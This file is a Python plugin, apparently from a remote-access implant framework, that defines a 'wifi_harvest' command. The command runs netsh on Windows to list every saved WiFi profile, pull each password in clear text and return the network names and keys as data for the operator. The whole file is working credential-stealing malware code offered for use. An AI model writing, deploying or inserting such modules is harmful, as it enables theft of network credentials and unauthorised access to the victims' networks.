PLUGIN = {"name": "wifi_harvest", "desc": "Extract saved WiFi passwords (Windows only)", "deps": [], "size": 0.7}

STUB_CODE = r"""
def _cmd_wifi_harvest(m):
    try:
        if platform.system() != "Windows": return {"output": "[!] Windows only"}
        r = subprocess.run(["netsh","wlan","show","profiles"], capture_output=True, text=True, timeout=30)
        profiles = []
        for line in r.stdout.split("\n"):
            if "All User Profile" in line:
                p = line.split(":")[-1].strip()
                r2 = subprocess.run(["netsh","wlan","show","profile",p,"key=clear"], capture_output=True, text=True, timeout=15)
                key = ""
                for l2 in r2.stdout.split("\n"):
                    if "Key Content" in l2: key = l2.split(":")[-1].strip()
                profiles.append({"ssid": p, "password": key})
        return {"data": {"networks": profiles, "count": len(profiles)}}
    except Exception as e: return {"output": f"[!] WiFi harvest: {e}"}
_CMDS["wifi_harvest"] = _cmd_wifi_harvest
"""

def get_commands():
    return {"wifi_harvest": "_cmd_wifi_harvest"}
